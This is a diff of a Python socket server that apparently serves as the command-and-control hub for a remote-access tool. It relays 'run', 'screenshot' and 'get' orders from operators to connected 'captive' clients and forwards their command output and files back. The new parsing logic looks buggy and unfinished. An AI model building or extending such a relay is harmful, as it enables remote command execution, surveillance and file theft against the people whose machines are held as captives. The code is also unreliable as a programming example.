@@ -9,7 +9,7 @@ s.bind(("localhost", 5000))
 clients = {}
 
 def opDefiner(data):
-    op = data.split()[1]
+    op = data.split()[1].strip()
     opSocket = clients.get(op)
     return op, opSocket
 
@@ -36,223 +36,166 @@ def file_sender(client, filename):
     finally:
         os.remove(filename)
 
-def receive_file(client, first_data, filename, file_size):
-    received = 0
-
-    with open(filename, "wb") as f:
-        file_data = first_data[:file_size]
-        # print("FILE_SIZE", file_size)
-        f.write(file_data)
-        received += len(file_data)
-
-        while received < file_size:
-            chunk = client.recv(min(4096, file_size - received))
-
-            if not chunk:
-                raise ConnectionError(
-                    "Client disconnected during file transfer"
-                )
-
-            f.write(chunk)
-            received += len(chunk)
-
-    return received
-
-
-def receive_cmd_output(client, val):
-    buffer = val.encode("UTF-8")
-
-    if b"CMD_OUTPUT_END\n" not in buffer:
-        while b"CMD_OUTPUT_END\n" not in buffer:
-            chunk = client.recv(1024)
-
-            if not chunk:
-                raise ConnectionError("Client disconnected during CMD_OUTPUT")
-
-            buffer += chunk
-    return buffer.decode("UTF-8", errors="ignore")
-
 def client_listener(client, username):
+    buffer = b""
     while True:
-        try:
+        data = client.recv(4096)
 
-            data = client.recv(1024)
-            # print("DATA: ", data)
-            buffer = data
-            if not data:
-                print("Client disconnected")
-                del clients[username]
-                client.close()
-                break
+        if not data:
+            break
 
-            elif b"FILE_TRANSFER" in buffer:
-                header_end = buffer.find(b"\n")
+        elif data == b"exit\n":
+            del clients[username]
+            client.close()
+            break
+            
+        buffer += data        
 
-                if header_end == -1:
-                    print("Incomplete FILE_TRANSFER header")
+        while buffer != b"":
+            nameSection = b"> " in buffer[0:30]
+            if nameSection == False:
+                if buffer.startswith(b"FILE_TRANSFER"):
+                    print(buffer)
+                    filename = buffer.split(b" ")[1].decode("UTF-8", errors="ignore")
+                    vip = clients.get(buffer.split(b" ")[3].decode())
+                    file_size = int(buffer.split(b" ")[4])
+
+                    if not filename or not vip or not file_size:
+                        vip.sendall("WRONG ARGUMENTS FOR FILE_TRANSFER".encode("UTF-8"))
+                        continue
+
+                    vip.sendall("SENDING_FORBIDDEN".encode("UTF-8"))
+
+                    end = buffer.find(b"HEADER-END\n")
+                    if end == -1:
+                        data = client.recv(4096)
+                        buffer += data
+                        continue
+
+                    with open(filename, "wb") as f:
+
+                        header = buffer[:end + len(b"HEADER-END\n")]
+                        buffer = buffer[end + len(b"HEADER-END\n"):]
+
+                        if buffer: 
+                            f.write(buffer)
+
+                        rest_of_file = file_size - len(buffer)
+
+                        while rest_of_file >= 4096:
+                            data = client.recv(4096)
+                            f.write(data)
+                            rest_of_file -= len(data)
+                        if rest_of_file > 0:
+                            data = client.recv(rest_of_file)
+                            f.write(data)
+
+                    file_sender(vip, os.path.join(os.getcwd(), filename))
+
+                    vip.sendall("SENDING ALLOWED".encode("UTF-8"))
+
+                    buffer = b""
                     continue
 
-                header = buffer[:header_end]
-                first_file_data = buffer[header_end + 1:]
+                elif buffer.startswith(b"CMD_OUTPUT "):
+                    ankor = b"CMD_OUTPUT_END\n"
 
-                parts = header.decode("UTF-8").split(" ", 4)
+                    while ankor not in buffer:
+                        chunk = client.recv(1024)
+                        if not chunk:
+                            raise ConnectionError("Client disconnected during CMD_OUTPUT")
+                        buffer += chunk
+                    vip, vipSocket = opDefiner(buffer.decode("UTF-8", errors="ignore"))
 
-                if len(parts) != 5:
-                    print("Invalid FILE_TRANSFER header:", header)
+                    cmd_buffer = buffer[:buffer.find(ankor)+len(ankor)]
+                    buffer = buffer[buffer.find(ankor)+len(ankor):]
+                    vipSocket.sendall(cmd_buffer)
                     continue
 
-                filename = parts[1]
-                priorityname = parts[3]
-                file_size = int(parts[4])
-
-                #print("FILE_TRANSFER DETECTED:",filename,"FROM:",priorityname,"SIZE:",file_size)
-
-                target = clients.get(priorityname)
-
-                if not target:
-                    print(f"Client {priorityname} not found.")
-                    continue
-
-                #print(f"Receiving {filename} from {username}")
-
-                receive_file(
-                    client,
-                    first_file_data,
-                    filename,
-                    file_size
-                )
-
-                #print(f"Sending {filename} to {priorityname}")
-
-                file_sender(target, filename)
-
+            if not b"\n" in buffer:
                 continue
 
-            data = data.decode("UTF-8", errors="ignore")
+            msg = buffer
+            buffer = buffer[buffer.find(b"> ")+2:]
 
-            #print(data)
-            if data == "exit\n":
-                del clients[username]
-                client.close()
-                break
-
-
-            datavalue = data.split("> ")[1].strip()
-            print (f"Received from {username}: {datavalue}")
-
-
-            if datavalue.startswith("screenshotFrom"):
+            if buffer.startswith(b"screenshotFrom"):
+                cmd = buffer.split(b"\n", 2)[0].decode()
                 try:
-                    captiveName, captive = opDefiner(datavalue)
-
+                    captiveName, captive = opDefiner(cmd)
+            
                     if captive is None:
                         client.sendall(
                             "No Captive Found\n".encode("UTF-8")
                         )
                         continue
-
+    
                     captive.sendall(
-                        f"-screenshot {username}\n".encode("UTF-8")
+                        f"{username} -screenshot".encode("UTF-8")
                     )
 
                     continue
-
+    
                 except Exception as e:
                     print(f"Screenshot error: {type(e).__name__}: {e}")
                     continue
+                finally:
+                    buffer = buffer.split(b"\n", 2)[1]
 
-            # elif datavalue.startswith("dataPush"):
-            #     captiveName, captive = opDefiner(datavalue)
-            #     print("DATAVALUE: ", datavalue)
-            #     filename = datavalue.split()[2]
-            #     file_size = datavalue.split()[4]
-            #     print("FILESIZE: ", file_size)
-            #     continue
+            if buffer.startswith(b"run"):
+                try:
+                    cmd = buffer.split(b"\n", 2)[0].decode("UTF-8", errors="ignore").strip()
+                    captiveName, captive = opDefiner(cmd)
+                    commandEx = cmd.split(" ", 2)[2].strip()
 
-            if datavalue.startswith("CMD_OUTPUT"):
+                    if not captive:
+                        raise ValueError("Client not found")
+                    
+                    if  captive == "" or commandEx == "":
+                        client.send(f"No command provided to run.\n".encode("UTF-8"))
+                        continue                
 
-                data = receive_cmd_output(client, data)
-                parts = data.split(" ", 2)
-                priority = parts[2].split(" ")[0]
-                # print(priority)
-                output = " ".join(data.split(" ")[5:])
+                    if captive:
+                        try:
+                            captive.send(f"{username} -run {commandEx}\n".encode("UTF-8"))
+                            buffer = buffer.split(b"\n", 2)[1]
+                            continue
+                        except Exception as e:
+                            print(f"Failed to send command to opoponent: {e}")
+                            buffer = buffer.split(b"\n", 2)[1]
+                    else:
+                        print(f"Client not found.")
+                        client.send(f"Client {captiveName} not found.\n".encode("UTF-8"))
+                        buffer = buffer.split(b"\n", 2)[1]
+                except Exception as e:
+                    client.send(f"Client not found.\n".encode("UTF-8"))
+                    buffer = buffer.split(b"\n", 2)[1]
+                    print(e)
+    
+            elif buffer.startswith(b"get"):
+                cmd = buffer.split(b"\n", 2)[0].decode() 
+                filename = cmd.split(" ")[2]
+                captiveName, captive = opDefiner(cmd)
 
-                prioritySocket = clients.get(priority)
-                # print(prioritySocket)
-
-                if prioritySocket:
-                    try:
-                        prioritySocket.send(
-                            f"{username}> {output}\n".encode("UTF-8")
-                        )
-                        continue
-
-                    except Exception as e:
-                        print(f"Failed to send output to {priority}: {e}")
-
-            
-            if datavalue.startswith("run"):
-                dataparamount = data.split("run")[1].strip()
-
-                #print(f"dataparamount: {dataparamount}")
-
-                if dataparamount == "":
-                    print("No command provided to run.")
-                    client.send(f"No command provided to run.\n".encode("UTF-8"))
-                    continue
-
-                captivename = data.split(" ")[2].strip()                
-                #print(f"Executing command from {captivename}: {datavalue.split(captivename + " ")[1]}")
-                command = datavalue.split(captivename + " ")[1].strip()
-                if command == "":
-                    print("No command provided to run.")
-                    client.send(f"No command provided to run.\n".encode("UTF-8"))
-                    continue
-
-                #print(f"Command to execute: {command}")
-                captive = clients.get(captivename)
-                if captive:
-                    try:
-                        captive.send(f"{username} -run {command}\n".encode("UTF-8"))
-                        continue
-                    except Exception as e:
-                        print(f"Failed to send command to {captivename}: {e}")
-                else:
-                    print(f"Client {captivename} not found.")
-                    client.send(f"Client {captivename} not found.\n".encode("UTF-8"))
-
-            elif datavalue.startswith("get"):
-                filename = datavalue.split("get ")[1].strip()
-                captivename = data.split(" ")[2].strip()
-                captive = clients.get(captivename)
                 if filename == "":
                     print("No filename provided to get.")
                     client.send(f"No filename provided to get.\n".encode("UTF-8"))
                     continue
-
-                #print(f"Sending file {filename} to {username}")
+    
                 if captive:
                     try:
-                        captive.send(f"{username} -get {filename}\n".encode("UTF-8"))
+                        captive.send(f"{username} -get {filename}".encode("UTF-8"))
                         continue
                     except Exception as e:
-                        print(f"Failed to send get request to {captivename}: {e}")
-                continue
-            
+                        print(f"Failed to send get request to {captiveName}: {e}")
+                    finally:
+                        buffer = buffer.split(b"\n", 2)[1]
+                    continue
             else:
-                data = data.encode("UTF-8")
+                cmd = msg.split(b"\n", 2)[0]
                 for connected_client in clients.values():
-                    #print("Sending to:", connected_client, "DATA: ", data.decode("UTF-8", errors="ignore"))
-                    connected_client.sendall(data)
-
-        except Exception as e:
-            print(f"ERROR: {e}")
-
-            if username in clients:
-                del clients[username]
-
-            client.close()
-            break
+                    connected_client.sendall(cmd)
+                buffer = buffer.split(b"\n", 2)[1]
+                
 
 s.listen(5)
 
